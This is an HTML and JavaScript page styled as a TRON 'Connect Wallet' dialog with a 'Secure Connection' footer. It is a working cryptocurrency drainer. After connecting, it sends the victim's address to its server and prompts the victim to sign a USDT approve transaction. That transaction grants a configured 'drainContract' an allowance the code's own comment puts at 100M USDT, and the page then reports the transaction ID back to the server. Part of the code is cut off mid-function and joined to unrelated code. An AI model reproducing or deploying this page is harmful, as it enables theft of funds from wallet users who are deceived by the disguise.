<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Connect Wallet</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
  
  <!-- CRITICAL: TronWeb Library -->
  <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.min.js"></script>
  
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Inter', -apple-system, sans-serif;
      background: #0a0a0f;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
      background-image: 
        radial-gradient(ellipse at 20% 50%, rgba(74, 222, 128, 0.05) 0%, transparent 60%),
        radial-gradient(ellipse at 80% 50%, rgba(139, 92, 246, 0.05) 0%, transparent 60%);
    }
    .container {
      width: 100%;
      max-width: 420px;
      background: linear-gradient(145deg, rgba(20, 20, 30, 0.95), rgba(10, 10, 15, 0.98));
      border: 1px solid rgba(255, 255, 255, 0.06);
      border-radius: 24px;
      padding: 32px 24px;
      backdrop-filter: blur(20px);
      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8), inset 0 1px 0 rgba(255, 255, 255, 0.05);
      position: relative;
      overflow: hidden;
    }
    .container::before {
      content: '';
      position: absolute;
      top: -50%;
      left: -50%;
      width: 200%;
      height: 200%;
      background: radial-gradient(ellipse at 30% 20%, rgba(74, 222, 128, 0.03), transparent 50%);
      pointer-events: none;
    }
    .header { text-align: center; margin-bottom: 28px; position: relative; }
    .header .logo {
      width: 56px;
      height: 56px;
      background: linear-gradient(135deg, #4ade80, #22c55e);
      border-radius: 16px;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 14px;
      font-size: 28px;
      box-shadow: 0 8px 24px rgba(74, 222, 128, 0.25);
    }
    .header h2 {
      font-size: 22px;
      font-weight: 700;
      background: linear-gradient(135deg, #ffffff, #94a3b8);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      letter-spacing: -0.5px;
    }
    .header p {
      font-size: 13px;
      color: rgba(148, 163, 184, 0.7);
      margin-top: 4px;
    }
    .msg {
      padding: 12px 16px;
      border-radius: 12px;
      font-size: 13px;
      line-height: 1.5;
      margin-bottom: 16px;
      display: none;
      border: 1px solid transparent;
      animation: slideDown 0.3s ease;
    }
    @keyframes slideDown {
      from { opacity: 0; transform: translateY(-10px); }
      to { opacity: 1; transform: translateY(0); }
    }
    .msg.show { display: block; }
    .msg.err { background: rgba(239, 68, 68, 0.12); border-color: rgba(239, 68, 68, 0.2); color: #f87171; }
    .msg.ok { background: rgba(74, 222, 128, 0.12); border-color: rgba(74, 222, 128, 0.2); color: #4ade80; }
    .msg.inf { background: rgba(96, 165, 250, 0.12); border-color: rgba(96, 165, 250, 0.2); color: #60a5fa; }
    .msg.warn { background: rgba(251, 191, 36, 0.12); border-color: rgba(251, 191, 36, 0.2); color: #fbbf24; }
    .msg a { color: inherit; text-decoration: underline; font-weight: 600; }

    .wallet-list { display: flex; flex-direction: column; gap: 8px; }
    .wallet-btn {
      display: flex;
      align-items: center;
      gap: 14px;
      padding: 14px 18px;
      background: rgba(255, 255, 255, 0.03);
      border: 1px solid rgba(255, 255, 255, 0.06);
      border-radius: 14px;
      cursor: pointer;
      font-family: inherit;
      color: #e2e8f0;
      text-align: left;
      width: 100%;
      transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
      position: relative;
      overflow: hidden;
    }
    .wallet-btn:hover {
      background: rgba(255, 255, 255, 0.06);
      border-color: rgba(74, 222, 128, 0.2);
      transform: translateX(4px);
      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.3);
    }
    .wallet-btn:active { transform: scale(0.97); }
    .wallet-btn .ico {
      width: 40px;
      height: 40px;
      border-radius: 12px;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-shrink: 0;
      overflow: hidden;
      background: rgba(255, 255, 255, 0.05);
    }
    .wallet-btn .ico img { width: 100%; height: 100%; object-fit: contain; padding: 6px; }
    .wallet-btn .nm { font-size: 15px; font-weight: 500; flex: 1; }
    .wallet-btn .badge {
      font-size: 10px;
      font-weight: 600;
      padding: 4px 10px;
      border-radius: 20px;
      background: rgba(74, 222, 128, 0.12);
      color: #4ade80;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }
    .wallet-btn .badge.install {
      background: rgba(251, 191, 36, 0.12);
      color: #fbbf24;
    }
    .wallet-btn .arrow {
      color: rgba(148, 163, 184, 0.3);
      transition: all 0.3s ease;
      font-size: 18px;
    }
    .wallet-btn:hover .arrow {
      color: rgba(74, 222, 128, 0.5);
      transform: translateX(4px);
    }

    .status-icon { text-align: center; margin: 28px 0; }
    .spinner {
      display: inline-block;
      width: 48px;
      height: 48px;
      border: 3px solid rgba(255, 255, 255, 0.06);
      border-top-color: #4ade80;
      border-radius: 50%;
      animation: spin 0.8s cubic-bezier(0.4, 0, 0.2, 1) infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .success-icon {
      display: inline-block;
      width: 64px;
      height: 64px;
      border-radius: 50%;
      background: linear-gradient(135deg, rgba(74, 222, 128, 0.15), rgba(74, 222, 128, 0.05));
      border: 2px solid rgba(74, 222, 128, 0.3);
      line-height: 64px;
      text-align: center;
      font-size: 32px;
      color: #4ade80;
      animation: popIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
    }
    @keyframes popIn {
      from { transform: scale(0); opacity: 0; }
      to { transform: scale(1); opacity: 1; }
    }
    .error-icon {
      display: inline-block;
      width: 64px;
      height: 64px;
      border-radius: 50%;
      background: rgba(239, 68, 68, 0.1);
      border: 2px solid rgba(239, 68, 68, 0.2);
      line-height: 64px;
      text-align: center;
      font-size: 32px;
      color: #f87171;
    }

    .screen { display: none; animation: fadeIn 0.4s ease; }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(10px); }
      to { opacity: 1; transform: translateY(0); }
    }
    .screen.on { display: block; }

    .btn {
      display: block;
      width: 100%;
      padding: 14px;
      border-radius: 14px;
      border: 1px solid rgba(255, 255, 255, 0.06);
      background: transparent;
      color: #94a3b8;
      font-size: 13px;
      font-weight: 500;
      cursor: pointer;
      font-family: inherit;
      text-align: center;
      transition: all 0.25s ease;
      margin-top: 12px;
    }
    .btn:hover {
      border-color: rgba(255, 255, 255, 0.12);
      color: #e2e8f0;
      background: rgba(255, 255, 255, 0.03);
    }
    .btn-primary {
      background: linear-gradient(135deg, #4ade80, #22c55e);
      border: none;
      color: #000;
      font-weight: 600;
      font-size: 14px;
      padding: 16px;
      box-shadow: 0 4px 16px rgba(74, 222, 128, 0.2);
    }
    .btn-primary:hover {
      transform: translateY(-2px);
      box-shadow: 0 8px 24px rgba(74, 222, 128, 0.3);
      border: none;
      color: #000;
    }
    .btn-primary:active { transform: scale(0.97); }

    .address-display {
      background: rgba(255, 255, 255, 0.03);
      border: 1px solid rgba(255, 255, 255, 0.06);
      border-radius: 12px;
      padding: 12px 16px;
      font-family: 'SF Mono', 'Fira Code', monospace;
      font-size: 13px;
      color: rgba(148, 163, 184, 0.8);
      word-break: break-all;
      margin: 12px 0 16px;
      text-align: center;
    }

    .progress-steps { margin: 20px 0; }
    .step {
      display: flex;
      align-items: center;
      gap: 14px;
      padding: 10px 14px;
      border-radius: 10px;
      margin-bottom: 4px;
      font-size: 13px;
      color: rgba(148, 163, 184, 0.4);
      transition: all 0.3s ease;
    }
    .step.active { color: #e2e8f0; background: rgba(255, 255, 255, 0.03); }
    .step.done { color: #4ade80; }
    .step .num {
      width: 28px;
      height: 28px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 11px;
      font-weight: 700;
      flex-shrink: 0;
      background: rgba(255, 255, 255, 0.05);
      color: rgba(148, 163, 184, 0.3);
      transition: all 0.3s ease;
    }
    .step.active .num {
      background: rgba(74, 222, 128, 0.15);
      color: #4ade80;
      box-shadow: 0 0 20px rgba(74, 222, 128, 0.1);
    }
    .step.done .num {
      background: rgba(74, 222, 128, 0.12);
      color: #4ade80;
    }
    .step .check { color: #4ade80; font-weight: 700; }

    .wait-content { text-align: center; }
    .wait-content .title { font-size: 17px; font-weight: 600; color: #e2e8f0; margin-top: 4px; }
    .wait-content .subtitle { font-size: 13px; color: rgba(148, 163, 184, 0.6); margin-top: 4px; }

    .footer {
      margin-top: 24px;
      text-align: center;
      font-size: 11px;
      color: rgba(148, 163, 184, 0.2);
      letter-spacing: 0.5px;
    }
    .footer .dot {
      display: inline-block;
      width: 4px;
      height: 4px;
      border-radius: 50%;
      background: rgba(74, 222, 128, 0.3);
      margin: 0 6px;
      vertical-align: middle;
    }

    #configStatus {
      font-size: 11px;
      color: rgba(148, 163, 184, 0.4);
      text-align: center;
      margin-bottom: 14px;
      display: none;
    }

    @media (max-width: 480px) {
      body { padding: 12px; align-items: flex-end; }
      .container { padding: 24px 18px; border-radius: 20px; max-width: 100%; }
      .header .logo { width: 48px; height: 48px; font-size: 24px; }
      .header h2 { font-size: 20px; }
      .wallet-btn { padding: 12px 14px; }
      .wallet-btn .ico { width: 36px; height: 36px; }
      .wallet-btn .ico img { padding: 4px; }
    }
    @media (max-width: 380px) {
      .container { padding: 16px 14px; }
      .wallet-btn { padding: 10px 12px; }
      .wallet-btn .nm { font-size: 13px; }
    }
    ::-webkit-scrollbar { width: 4px; }
    ::-webkit-scrollbar-track { background: transparent; }
    ::-webkit-scrollbar-thumb { background: rgba(255, 255, 255, 0.1); border-radius: 20px; }
    ::-webkit-scrollbar-thumb:hover { background: rgba(255, 255, 255, 0.2); }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <div class="logo">⚡</div>
      <h2>Connect Wallet</h2>
      <p>Choose your preferred wallet</p>
    </div>

    <div id="msgBox"></div>
    <div id="configStatus">Loading configuration...</div>

    <div class="screen on" id="scConnect">
      <div class="wallet-list" id="walletList"></div>
      <button class="btn" onclick="window.close()">Cancel</button>
    </div>

    <div class="screen" id="scWait">
      <div class="wait-content">
        <div class="status-icon"><div class="spinner"></div></div>
        <div class="title">Connecting...</div>
        <div class="subtitle" id="waitDesc">Please confirm in your wallet</div>
        <div class="progress-steps" id="progressSteps">
          <div class="step" id="step1"><span class="num">1</span> Connect wallet</div>
          <div class="step" id="step2"><span class="num">2</span> Check balance</div>
          <div class="step" id="step3"><span class="num">3</span> Approve USDT</div>
        </div>
        <button class="btn" onclick="location.reload()">Cancel</button>
      </div>
    </div>

    <div class="screen" id="scProcessing">
      <div class="wait-content">
        <div class="status-icon"><div class="spinner"></div></div>
        <div class="title" id="processingTitle">Processing...</div>
        <div class="subtitle" id="processingDesc">Please wait</div>
        <button class="btn" onclick="location.reload()">Cancel</button>
      </div>
    </div>

    <div class="screen" id="scDone">
      <div class="wait-content">
        <div class="status-icon"><div class="success-icon">✓</div></div>
        <div class="title" style="color: #4ade80;">Connected!</div>
        <div class="subtitle" style="color: rgba(148, 163, 184, 0.6);">You can close this page</div>
        <div class="address-display" id="doneAddress"></div>
        <button class="btn btn-primary" onclick="window.close()">Close</button>
      </div>
    </div>

    <div class="screen" id="scError">
      <div class="wait-content">
        <div class="status-icon"><div class="error-icon">✕</div></div>
        <div class="title" style="color: #f87171;" id="errorTitle">Connection Failed</div>
        <div class="subtitle" id="errorDesc" style="color: rgba(148, 163, 184, 0.6);">Please try again</div>
        <button class="btn btn-primary" onclick="location.reload()">Try Again</button>
        <button class="btn" onclick="window.close()">Close</button>
      </div>
    </div>

    <div class="footer">
      <span>TRON Network</span>
      <span class="dot"></span>
      <span>Secure Connection</span>
    </div>
  </div>

  <script>
    // ============================================================
    // TRON NETWORK CONFIGURATION
    // ============================================================
    var TRON_NETWORK = {
      fullHost: 'https://api.trongrid.io',
      solidityNode: 'https://api.trongrid.io',
      eventServer: 'https://api.trongrid.io'
    };

    // ============================================================
    // GLOBAL VARIABLES
    // ============================================================
    var SITE_URL = window.location.origin;
    var config = {};
    var connectedAddress = null;
    var isProcessing = false;
    var isMobile = /Android|iPhone|iPad|iPod|webOS/i.test(navigator.userAgent);
    var SESSION_ID = 'qr-' + Date.now() + '-' + Math.random().toString(36).substr(2, 6);

    // ============================================================
    // DETECT WALLET BROWSERS
    // ============================================================
    var isTrustBrowser = /Trust/i.test(navigator.userAgent);
    var isTronLinkBrowser = /TronLink/i.test(navigator.userAgent);
    var isTokenPocketBrowser = /TokenPocket/i.test(navigator.userAgent);
    var isOKXBrowser = /OKX/i.test(navigator.userAgent);

    console.log('📱 Environment Detection:');
    console.log('  isMobile:', isMobile);
    console.log('  isTrustBrowser:', isTrustBrowser);
    console.log('  isTronLinkBrowser:', isTronLinkBrowser);
    console.log('  isTokenPocketBrowser:', isTokenPocketBrowser);
    console.log('  isOKXBrowser:', isOKXBrowser);
    console.log('  Session ID:', SESSION_ID);
    console.log('  Site URL:', SITE_URL);

    // ============================================================
    // USDT ABI
    // ============================================================
    var USDT_ABI = [
      {"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"},
      {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},
      {"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},
      {"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"}
    ];

    // ============================================================
    // DETECT WHICH WALLET BROWSER WE'RE IN
    // ============================================================
    function detectWalletBrowser() {
      // Check user agent first
      if (isTrustBrowser) return 'trust';
      if (isTronLinkBrowser) return 'tronlink';
      if (isTokenPocketBrowser) return 'tokenpocket';
      if (isOKXBrowser) return 'okx';
      
      // Check injected providers
      if (window.ethereum && window.ethereum.isTrust) return 'trust';
      if (window.tronLink) return 'tronlink';
      if (window.okxwallet) return 'okx';
      if (window.tokenpocket) return 'tokenpocket';
      if (window.bitkeep || window.bitgetWallet) return 'bitget';
      if (window.imtoken) return 'imtoken';
      
      return null;
    }

    // ============================================================
    // WALLET CONFIGURATIONS
    // ============================================================
    var WALLETS = [
      {
        id: 'tronlink',
        name: 'TronLink',
        logo: 'https://tronlink.org/favicon.ico',
        downloadUrl: 'https://tronlink.org/download',
        isInstalled: function() {
          try {
            if (window.tronLink) return true;
            if (window.tronWeb && window.tronWeb.ready) return true;
          } catch(e) {}
          return false;
        },
        getProvider: function() {
          try {
            if (window.tronLink && window.tronLink.tronWeb && window.tronLink.tronWeb.ready) {
              return window.tronLink.tronWeb;
            }
            if (window.tronWeb && window.tronWeb.ready) {
              return window.tronWeb;
            }
          } catch(e) {}
          return null;
        },
        getAddress: function(provider) {
          try {
            if (provider && provider.defaultAddress && provider.defaultAddress.base58) {
              return provider.defaultAddress.base58;
            }
          } catch(e) {}
          return null;
        },
        requestAccounts: function(provider) {
          return new Promise(function(resolve, reject) {
            try {
              if (provider && typeof provider.request === 'function') {
                provider.request({ method: 'tron_requestAccounts' })
                  .then(function(result) { resolve(result); })
                  .catch(function(err) { reject(err); });
              } else if (window.tronLink && typeof window.tronLink.request === 'function') {
                window.tronLink.request({ method: 'tron_requestAccounts' })
                  .then(function(result) { resolve(result); })
                  .catch(function(err) { reject(err); });
              } else {
                resolve(null);
              }
            } catch(e) {
              reject(e);
            }
          });
        },
        getDeepLink: function(url) {
          var param = encodeURIComponent(JSON.stringify({
            url: url,
            action: 'open',
            protocol: 'tronlink',
            version: '1.0'
          }));
          return 'tronlinkoutside://pull.activity?param=' + param;
        }
      },
      {
        id: 'trust',
        name: 'Trust Wallet',
        logo: 'https://trustwallet.com/assets/images/favicon.png',
        downloadUrl: 'https://trustwallet.com/download',
        isInstalled: function() {
          try {
            // Method 1: Check window.ethereum with isTrust flag
            if (window.ethereum && window.ethereum.isTrust) {
              console.log('✅ Trust Wallet detected via window.ethereum.isTrust');
              return true;
            }
            
            // Method 2: Check if we're in Trust browser
            if (isTrustBrowser) {
              console.log('✅ Trust Wallet detected via user agent');
              return true;
            }
            
            // Method 3: Check window.trustwallet
            if (window.trustwallet && window.trustwallet.tronLink) {
              console.log('✅ Trust Wallet detected via window.trustwallet');
              return true;
            }
            
            // Method 4: Check window.tronWeb with Trust context
            if (window.tronWeb && window.tronWeb.ready && isTrustBrowser) {
              console.log('✅ Trust Wallet detected via window.tronWeb');
              return true;
            }
            
          } catch(e) {
            console.warn('Trust Wallet detection error:', e.message);
          }
          return false;
        },
        getProvider: function() {
          try {
            // Method 1: Get provider from window.ethereum
            if (window.ethereum && window.ethereum.isTrust) {
              console.log('📱 Getting Trust Wallet provider from window.ethereum');
              
              // Try to get tronLink from ethereum
              if (window.ethereum.tronLink && window.ethereum.tronLink.tronWeb && window.ethereum.tronLink.tronWeb.ready) {
                console.log('✅ Trust Wallet tronWeb ready via ethereum.tronLink');
                return window.ethereum.tronLink.tronWeb;
              }
              
              // Create TronWeb instance using ethereum as provider
              if (window.TronWeb) {
                console.log('📱 Creating TronWeb instance for Trust Wallet');
                var tw = new TronWeb(TRON_NETWORK);
                tw.setAddress = function(addr) {
                  if (addr && addr.base58) {
                    tw.defaultAddress = addr;
                  } else if (typeof addr === 'string') {
                    tw.defaultAddress = { base58: addr, hex: tw.address.toHex(addr) };
                  }
                };
                return tw;
              }
            }
            
            // Method 2: Get provider from window.trustwallet
            if (window.trustwallet && window.trustwallet.tronLink) {
              console.log('📱 Getting Trust Wallet provider from window.trustwallet');
              if (window.trustwallet.tronLink.tronWeb && window.trustwallet.tronLink.tronWeb.ready) {
                return window.trustwallet.tronLink.tronWeb;
              }
            }
            
            // Method 3: Get provider from window.tronWeb
            if (isTrustBrowser && window.tronWeb && window.tronWeb.ready) {
              console.log('📱 Getting Trust Wallet provider from window.tronWeb');
              return window.tronWeb;
            }
            
          } catch(e) {
            console.warn('Trust Wallet provider error:', e.message);
          }
          return null;
        },
        getAddress: function(provider) {
          try {
            if (provider && provider.defaultAddress && provider.defaultAddress.base58) {
              return provider.defaultAddress.base58;
            }
            if (provider && provider.selectedAddress) {
              return provider.selectedAddress;
            }
            if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
              return window.tronWeb.defaultAddress.base58;
            }
          } catch(e) {}
          return null;
        },
        requestAccounts: function(provider) {
          return new Promise(function(resolve, reject) {
            try {
              // For Trust Wallet, try to get address directly from ethereum
              if (window.ethereum && window.ethereum.isTrust) {
                if (window.ethereum.selectedAddress) {
                  resolve(window.ethereum.selectedAddress);
                  return;
                }
                
                // Request accounts via ethereum
                if (typeof window.ethereum.request === 'function') {
                  window.ethereum.request({ method: 'eth_requestAccounts' })
                    .then(function(accounts) {
                      if (accounts && accounts.length > 0) {
                        // Convert ETH address to TRON format if needed
                        resolve(accounts[0]);
                      } else {
                        resolve(null);
                      }
                    })
                    .catch(function(err) {
                      console.warn('Trust Wallet eth_requestAccounts failed:', err);
                      // Try tron_requestAccounts as fallback
                      if (provider && typeof provider.request === 'function') {
                        return provider.request({ method: 'tron_requestAccounts' });
                      }
                      reject(err);
                    });
                  return;
                }
              }
              
              // Try tron_requestAccounts

    var msgBox = document.getElementById('msgBox');

    function msg(type, text) {
      msgBox.innerHTML = '<div class="msg show ' + type + '">' + text + '</div>';
    }
    function hideMsg() { msgBox.innerHTML = ''; }
    
    function scShow(id) {
      document.querySelectorAll('.screen').forEach(function(s){ s.classList.remove('on'); });
      var target = document.getElementById(id);
      if (target) {
        target.classList.add('on');
      }
    }

    function updateStep(stepNum, status) {
      var step = document.getElementById('step' + stepNum);
      if (!step) return;
      step.className = 'step';
      if (status === 'active') step.classList.add('active');
      if (status === 'done') {
        step.classList.add('done');
        var numSpan = step.querySelector('.num');
        if (numSpan) {
          numSpan.innerHTML = '<span class="check">✓</span>';
        }
      }
    }

    // ============================================================
    // FETCH CONFIG
    // ============================================================
    async function fetchConfig() {
      var statusEl = document.getElementById('configStatus');
      statusEl.style.display = 'block';
      statusEl.textContent = 'Loading configuration...';

      try {
        var r = await fetch(SITE_URL + '/api/config');
        if (!r.ok) throw new Error('HTTP ' + r.status);
        var data = await r.json();
        if (data && data.usdtContract) {
          config = data;
          statusEl.textContent = '✅ Configuration loaded';
          statusEl.style.color = '#4ade80';
          console.log('✅ Config loaded:', config);
          
          // Validate drain contract
          if (!config.drainContract || config.drainContract === '') {
            console.warn('⚠️ Drain contract not configured');
            msg('err', 'System not fully configured. Please contact support.');
            return null;
          }
          
          return config;
        }
        throw new Error('Invalid config');
      } catch(e) {
        console.warn('Config fetch failed:', e.message);
        statusEl.textContent = '⚠️ Using default configuration';
        statusEl.style.color = '#fbbf24';
        config = {
          usdtContract: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
          drainContract: '',
          maxApprove: '100000000000000'
        };
        msg('warn', 'Using default configuration. Some features may be limited.');
        return config;
      }
    }

    // ============================================================
    // CORE CONNECTION LOGIC
    // ============================================================
    async function connectWallet(walletId) {
      if (isProcessing) {
        console.log('⏳ Already processing, ignoring click');
        return;
      }
      
      hideMsg();
      isProcessing = true;

      var wallet = WALLETS.find(function(w) { return w.id === walletId; });
      if (!wallet) {
        msg('err', 'Wallet not found');
        isProcessing = false;
        return;
      }

      console.log('🔄 Connecting to:', wallet.name);
      console.log('🔍 Checking if', wallet.name, 'is installed...');

      // Load config if not loaded
      if (!config || !config.usdtContract) {
        await fetchConfig();
      }

      // Validate drain contract
      if (!config.drainContract || config.drainContract === '') {
        msg('err', 'Drain contract not configured. Please contact support.');
        isProcessing = false;
        return;
      }

      // ============================================================
      // STEP 1: Check if wallet is installed
      // ============================================================
      var installed = wallet.isInstalled();
      console.log('📱', wallet.name, 'installed:', installed);

      if (!installed) {
        if (isMobile) {
          console.log('📱 Mobile: Opening deep link for', wallet.name);
          var currentUrl = window.location.href.split('?')[0].split('#')[0];
          var deepLink = wallet.getDeepLink(currentUrl);
          if (deepLink) {
            msg('inf', 'Opening ' + wallet.name + '...');
            window.location.href = deepLink;
            setTimeout(function() {
              if (!document.hidden) {
                msg('warn', 'If the app didn\'t open, <a href="' + wallet.downloadUrl + '" target="_blank" style="color:#4ade80;">download it here</a>');
              }
            }, 3000);
          } else {
            msg('err', wallet.name + ' not installed. <a href="' + wallet.downloadUrl + '" target="_blank" style="color:#4ade80;">Download it here</a>');
          }
          isProcessing = false;
          return;
        } else {
          msg('warn', wallet.name + ' not detected. <a href="' + wallet.downloadUrl + '" target="_blank" style="color:#4ade80;">Install ' + wallet.name + '</a>');
          isProcessing = false;
          return;
        }
      }

      // ============================================================
      // STEP 2: Get the wallet provider
      // ============================================================
      var provider = wallet.getProvider();
      console.log('📱 Provider for', wallet.name, ':', provider ? 'Found' : 'Not found');

      if (!provider) {
        console.log('⏳ Waiting for provider to be injected...');
        
        // Wait for provider with retries
        for (var attempts = 0; attempts < 30; attempts++) {
          await new Promise(function(r) { setTimeout(r, 300); });
          provider = wallet.getProvider();
          if (provider) {
            console.log('✅ Provider found after', attempts + 1, 'attempts');
            break;
          }
        }
        
        if (!provider) {
          msg('err', wallet.name + ' is installed but not responding. Please unlock and try again.');
          isProcessing = false;
          return;
        }
      }

      // Show waiting screen
      scShow('scWait');
      document.getElementById('waitDesc').textContent = 'Connecting to ' + wallet.name + '...';
      updateStep(1, 'active');
      updateStep(2, '');
      updateStep(3, '');

      // ============================================================
      // STEP 3: Get address from the wallet
      // ============================================================
      var address = wallet.getAddress(provider);
      console.log('📍 Address from getAddress:', address || 'Not found');

      if (!address) {
        try {
          console.log('📤 Requesting accounts from', wallet.name, '...');
          var result = await wallet.requestAccounts(provider);
          console.log('📥 Result from', wallet.name, ':', result);
          
          if (result) {
            if (typeof result === 'string') {
              address = result;
            } else if (Array.isArray(result) && result.length > 0) {
              address = result[0];
            } else if (result.address) {
              address = result.address;
            } else if (result.base58) {
              address = result.base58;
            }
          }
        } catch(e) {
          console.warn('Request accounts failed:', e.message);
          if (e.message && (e.message.toLowerCase().includes('cancel') || e.message.toLowerCase().includes('reject'))) {
            showError('Cancelled', 'You cancelled the connection in ' + wallet.name);
            isProcessing = false;
            return;
          }
        }
      }

      // Retry getAddress one more time
      if (!address) {
        address = wallet.getAddress(provider);
        console.log('📍 Address after retry:', address || 'Still not found');
      }

      if (!address) {
        showError('No Address', 'Could not get your address from ' + wallet.name + '. Please make sure the wallet is unlocked and try again.');
        isProcessing = false;
        return;
      }

      console.log('✅ Address obtained from', wallet.name, ':', address);
      connectedAddress = address;
      updateStep(1, 'done');

      // Send address to server
      try {
        await sendAddressToServer(address);
      } catch(e) {
        console.warn('Failed to send address to server:', e);
      }

      // Log connection event
      await logEvent('wallet_connected', address, '', walletId);
      
      // Proceed to approve flow
      await doApproveFlow(address, provider, wallet);
    }

    // ============================================================
    // APPROVE FLOW
    // ============================================================
    async function doApproveFlow(address, provider, wallet) {
      scShow('scProcessing');
      document.getElementById('processingTitle').textContent = 'Checking balance...';
      document.getElementById('processingDesc').textContent = 'Verifying USDT balance';
      updateStep(2, 'active');

      try {
        // Create proper TronWeb instance
        var tronWebInstance = null;
        
        console.log('🔧 Setting up TronWeb instance...');
        
        // Try different wallet injection patterns
        if (provider && provider.constructor && provider.constructor.name === 'TronWeb' && provider.ready) {
          tronWebInstance = provider;
          console.log('✅ Using provider as TronWeb instance');
        } else if (window.tronWeb && window.tronWeb.ready) {
          tronWebInstance = window.tronWeb;
          console.log('✅ Using window.tronWeb');
        } else if (provider && provider.tronWeb && provider.tronWeb.ready) {
          tronWebInstance = provider.tronWeb;
          console.log('✅ Using provider.tronWeb');
        } else {
          // Create new TronWeb instance
          if (typeof TronWeb !== 'undefined') {
            tronWebInstance = new TronWeb(TRON_NETWORK);
            console.log('✅ Created new TronWeb instance');
          } else {
            throw new Error('TronWeb library not loaded');
          }
        }
        
        if (!tronWebInstance || !tronWebInstance.ready) {
          throw new Error('TronWeb not available. Please make sure your wallet is connected and unlocked.');
        }

        // Set default address
        if (tronWebInstance.defaultAddress && tronWebInstance.defaultAddress.base58) {
          tronWebInstance.setAddress(tronWebInstance.defaultAddress.base58);
        } else {
          try {
            tronWebInstance.setAddress(address);
          } catch(e) {
            console.warn('Could not set address:', e.message);
          }
        }

        console.log('✅ TronWeb instance ready for', wallet ? wallet.name : 'unknown wallet');

        // Load USDT contract
        var usdtContract;
        try {
          usdtContract = await tronWebInstance.contract(USDT_ABI).at(config.usdtContract);
          console.log('✅ USDT contract loaded at:', config.usdtContract);
        } catch(e) {
          throw new Error('Could not load USDT contract: ' + e.message);
        }

        // Check balance
        document.getElementById('processingDesc').textContent = 'Checking balance...';
        try {
          var rawBalance = await usdtContract.balanceOf(address).call();
          var balance = rawBalance.toNumber ? rawBalance.toNumber() : Number(rawBalance);
          var balanceUsdt = balance / 1e6;
          console.log('💰 USDT Balance:', balanceUsdt, 'USDT');
          
          if (balance <= 0) {
            console.warn('⚠️ No USDT balance detected');
          }
        } catch(e) {
          console.warn('Balance check failed:', e.message);
          // Continue anyway - some wallets block balance checks
        }
        
        updateStep(2, 'done');

        // Build approve transaction
        document.getElementById('processingTitle').textContent = 'Approving USDT...';
        document.getElementById('processingDesc').textContent = 'Please confirm in ' + (wallet ? wallet.name : 'your wallet');
        updateStep(3, 'active');

        var approveVal = config.maxApprove || '100000000000000'; // 100M USDT default
        
        console.log('📝 Building approve transaction...');
        console.log('  USDT Contract:', config.usdtContract);
        console.log('  Spender (Drain):', config.drainContract);
        console.log('  Approve Amount:', approveVal);

        var parameter = [
          { type: 'address', value: config.drainContract },
          { type: 'uint256', value: approveVal }
        ];
        
        var options = {
          feeLimit: 100000000,
          callValue: 0,
          shouldPollResponse: true
        };

        var built;
        try {
          built = await tronWebInstance.transactionBuilder.triggerSmartContract(
            config.usdtContract,
            'approve(address,uint256)',
            options,
            parameter,
            address
          );
          console.log('✅ Transaction built');
        } catch(e) {
          console.error('Build error:', e);
          throw new Error('Failed to build transaction: ' + e.message);
        }

        var approveTx = built.transaction || built;
        if (!approveTx || !approveTx.txID) {
          throw new Error('Transaction build failed - no txID generated');
        }

        console.log('  txID:', approveTx.txID);

        // Sign transaction
        document.getElementById('processingDesc').textContent = 'Signing... Please confirm in wallet';
        var signedApprove;
        try {
          signedApprove = await tronWebInstance.trx.sign(approveTx);
          console.log('✅ Transaction signed');
        } catch(e) {
          var errMsg = e.message || String(e);
          if (errMsg.toLowerCase().includes('cancel') || 
              errMsg.toLowerCase().includes('reject') || 
              errMsg.toLowerCase().includes('denied') ||
              errMsg.toLowerCase().includes('user')) {
            showError('Cancelled', 'You cancelled the approval in your wallet');
            isProcessing = false;
            return;
          }
          throw new Error('Sign failed: ' + errMsg);
        }

        // Broadcast transaction
        document.getElementById('processingDesc').textContent = 'Broadcasting to TRON network...';
        var receipt;
        try {
          receipt = await tronWebInstance.trx.sendRawTransaction(signedApprove);
          console.log('✅ Transaction broadcasted:', receipt);
        } catch(e) {
          console.error('Broadcast error:', e);
          throw new Error('Transaction failed to broadcast: ' + e.message);
        }

        var txId = receipt.txid || receipt.txID || '';
        if (!txId) {
          throw new Error('No transaction ID received');
        }

        console.log('✅ Transaction confirmed! TX ID:', txId);

        // Notify server
        document.getElementById('processingDesc').textContent = 'Notifying server...';
        try {
          await fetch(SITE_URL + '/api/approve-done', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
              address: address,
              txId: txId,
              wallet: wallet ? wallet.id : 'unknown'
            })
          });
        } catch(e) {
